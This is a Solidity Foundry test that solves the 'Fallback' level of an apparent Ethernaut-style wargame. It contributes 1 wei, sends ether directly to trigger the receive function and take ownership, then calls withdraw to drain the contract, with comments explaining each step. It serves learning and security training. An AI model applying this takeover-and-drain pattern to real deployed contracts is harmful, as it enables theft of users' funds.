// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Fallback.sol";
import "src/levels/FallbackFactory.sol";

contract TestFallback is BaseTest {
    Fallback private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new FallbackFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Fallback(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.owner(), address(levelFactory));
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player);

        level.contribute{value: 1 wei}();

        // Receive fn of Fallback contract won't be able to receive ether unless we have a contribution of atleast 1 wei
        // Therefore, first contributing 1 wei (can only send less than 0.001 eth via contribute fn)
        // Once we have greater than 0 contribution then we can invoke receive fn of Fallback contract by
        // sending any amount of ether directly to the Fallback contract, which will make us
        // the owner of the contract and then we can call withdraw fn to drain all the funds
        (bool success, ) = address(level).call{value: 1 wei}("");
        require(success, "Transfer Failed");

        level.withdraw();

        vm.stopPrank();
    }
}
